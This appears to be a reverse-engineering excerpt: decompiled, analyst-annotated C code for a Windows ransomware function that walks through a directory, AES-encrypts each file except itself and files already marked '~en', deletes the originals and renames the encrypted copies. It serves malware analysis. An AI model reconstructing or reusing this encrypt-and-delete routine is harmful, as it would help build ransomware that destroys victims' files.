
/* WARNING: Function: _alloca_probe replaced with injection: alloca_probe */

void EncryptAndRenameFiles_140007590(short *dir)

{
  DWORD DVar1;
  int iVar2;
  BOOL BVar3;
  LPWSTR _Str2;
  ulonglong uVar4;
  undefined auStack_1138[32];
  undefined local_1118;
  DWORD local_1114;
  HANDLE local_1110;
  WCHAR *output_addr;
  WCHAR *input_addr;
  LPCWSTR local_10f8;
  WCHAR *local_10f0;
  _WIN32_FIND_DATAW local_10e8;
  wchar_t local_e98[8];
  WCHAR local_e88[264];
  short local_c78[264];
  WCHAR local_a68[264];
  WCHAR local_858[264];
  WCHAR local_648[264];
  WCHAR local_438[264];
  WCHAR local_228[264];
  ulonglong local_18;
  undefined8 uStack_8;

  uStack_8 = 0x14000759f;
  local_18 = DAT_140086038 ^ (ulonglong)auStack_1138;
  local_1118 = 0;
  local_1110 = (HANDLE)0xffffffffffffffff;
  local_1114 = 0;
  ConcatWPath_140007b20(dir, 0x104, (short *)"\\");
  CopyWPath_140007bc0(local_e88, 0x104, dir);
  ConcatWPath_140007b20(local_e88, 0x104, (short *)"*");
  local_1110 = FindFirstFileW(local_e88, &local_10e8);
  if (local_1110 == (HANDLE)0xffffffffffffffff)
  {
    DVar1 = GetLastError();
    thunk_FUN_140007510(L"No file found\n", DVar1);
  }
  else
  {
    /* AES Encryption */
    printf((char *)L"Listing files in directory... ");
    do
    {
      /* Exclude Directory */
      if ((local_10e8.dwFileAttributes & 0x10) == 0)
      {
        CopyWPath_140007bc0(local_a68, 0x104, dir);
        input_addr = local_a68;
        ConcatWPath_140007b20(input_addr, 0x104, local_10e8.cFileName);
        GetModuleFileNameW((HMODULE)0x0, local_858, 0x104);
        copy_14000c700((undefined8 *)local_e98,
                            (undefined8 *)local_10e8.cFileName, 6);
        /* Exclude "~en" */
        iVar2 = wcscmp(local_e98, L"~en");
        if (iVar2 != 0)
        {
          _Str2 = PathFindFileNameW(local_858);
          /* Exclude Malware Itelf */
          iVar2 = wcscmp(local_10e8.cFileName, _Str2);
          if (iVar2 != 0)
          {
            CopyWPath_140007bc0(local_648, 0x104, dir);
            output_addr = local_648;
            ConcatWPath_140007b20(output_addr,0x104,L"~en");
            ConcatWPath_140007b20(output_addr, 0x104, local_10e8.cFileName);
            AES_Encrypt_140007080(input_addr, output_addr);
            DeleteFileW(input_addr);
          }
        }
      }
      BVar3 = FindNextFileW(local_1110, &local_10e8);
    } while (BVar3 != 0);
    /* Rename */
    CopyWPath_140007bc0(local_e88, 0x104, dir);
    ConcatWPath_140007b20(local_e88, 0x104, L"\\~en*");
    local_1110 = FindFirstFileW(local_e88, &local_10e8);
    if (local_1110 == (HANDLE)0xffffffffffffffff)
    {
      DVar1 = GetLastError();
      thunk_FUN_140007510(L"No file found\n", DVar1);
    }
    else
    {
      printf((char *)L"Preparing to rename files...\n");
      do
      {
        if ((local_10e8.dwFileAttributes & 0x10) == 0)
        {
          CopyWPath_140007bc0(local_438, 0x104, dir);
          local_10f0 = local_438;
          ConcatWPath_140007b20(local_10f0, 0x104, local_10e8.cFileName);
          thunk_FUN_14000cf50((undefined(*)[16])local_c78, 0, 0x208);
          uVar4 = thunk_FUN_14003cf74((undefined(*)[32])local_10e8.cFileName);
          copy_14000c700((undefined8 *)local_c78,
                              (undefined8 *)(local_10e8.cFileName + 3),
                              uVar4 * 2 - 6);
          CopyWPath_140007bc0(local_228, 0x104, dir);
          local_10f8 = local_228;
          ConcatWPath_140007b20(local_10f8, 0x104, local_c78);
          MoveFileW(local_10f0, local_10f8);
        }
        BVar3 = FindNextFileW(local_1110, &local_10e8);
      } while (BVar3 != 0);
    }
  }
  local_1114 = GetLastError();
  if (local_1114 != 0x12)
  {
    thunk_FUN_140007510(L"No file found", local_1114);
  }
  FindClose(local_1110);
  thunk_FUN_14000ae80(local_18 ^ (ulonglong)auStack_1138);
  return;
}
